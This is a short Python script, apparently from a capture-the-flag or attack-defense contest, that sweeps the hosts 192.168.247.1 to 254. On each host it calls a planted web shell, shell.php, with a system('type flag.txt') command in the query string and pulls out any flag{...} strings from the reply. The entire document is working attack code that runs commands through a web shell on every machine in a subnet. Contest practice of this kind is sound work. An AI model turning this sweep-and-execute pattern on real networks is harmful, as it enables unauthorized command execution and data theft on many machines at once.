import urllib.request
import urllib.parse
import re
for i in range(1, 255):
    try:
        url = 'http://192.168.247.{}'
        shell_url = url+'/shell.php?admin=system(%27type%20flag.txt%27);'
        get = urllib.request.urlopen(shell_url.format(str(i)))
        request = get.read()
        flag = request.decode('utf-8')
        print(url.format(str(i)),re.findall("flag{.*?}", flag))
    except:
        pass
